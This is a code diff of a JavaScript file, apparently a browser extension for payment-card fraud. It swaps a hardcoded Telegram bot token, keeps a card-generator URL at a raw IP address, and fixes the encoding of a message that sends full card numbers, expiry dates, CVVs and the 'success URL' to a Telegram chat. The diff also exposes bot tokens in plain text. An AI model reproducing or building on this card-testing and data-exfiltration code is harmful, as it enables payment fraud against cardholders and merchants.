@@ -1,6 +1,6 @@
 // Configuration
 const CONFIG = {
-  BOT_TOKEN: '7436228982:AAGcluJ-xUNSYP3FLf6WHiwOheb-hLjVi7E',
+  BOT_TOKEN: '8099253215:AAEcuifyBKSXaw5uy0Fku1Wc3XCVvAVDKIM',
   CARD_GENERATOR_URL: 'http://193.203.162.2:1490/bin=',
   DEBUGGER_VERSION: '1.3',
   RETRY_DELAY: 2000,
@@ -90,13 +90,13 @@ async function getCardForTab(tabId) {
 // Telegram integration
 async function sendCardToTelegram(cardDetails, successUrl) {
   const detailedMessage = `
-âžœð˜—ð˜ˆð˜ ð˜”ð˜Œð˜•ð˜› ð˜šð˜œð˜Šð˜Šð˜Œð˜šð˜šð˜ð˜œð˜“ð˜“ð˜ 
+➜𝘗𝘈𝘠𝘔𝘌𝘕𝘛 𝘚𝘜𝘊𝘊𝘌𝘚𝘚𝘍𝘜𝘓𝘓𝘠
 ========================
-âžœð˜Šð˜Š: 
+➜𝘊𝘊: 
 ${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}
 
-âžœð˜šð˜œð˜Šð˜Šð˜Œð˜šð˜š ð˜œð˜™ð˜“: 
-${successUrl}ðŸŽ‰
+➜𝘚𝘜𝘊𝘊𝘌𝘚𝘚 𝘜𝘙𝘓: 
+${successUrl}🎉
 ========================
 `;
 
